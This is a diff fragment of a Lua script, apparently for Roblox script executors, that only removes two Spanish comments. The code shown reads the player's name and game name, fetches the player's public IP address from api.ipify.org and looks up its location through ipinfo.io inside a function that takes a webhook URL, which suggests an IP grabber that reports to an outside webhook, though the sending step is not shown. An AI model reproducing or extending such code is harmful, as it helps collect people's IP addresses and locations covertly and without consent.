@@ -4,14 +4,13 @@ local function web(webhookURL)
         local playerName = game.Players.LocalPlayer.Name
         local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
         
-        -- Obtener la dirección IP del jugador
         local req = request({
             Url = "https://api.ipify.org/",
             Method = "GET"
         })
         local ipAddress = req.Body
         
-        -- Obtener el país basado en la dirección IP
+
         local country = "Unknown"
         local response = HttpService:GetAsync("https://ipinfo.io/" .. ipAddress .. "/json")
         if response then
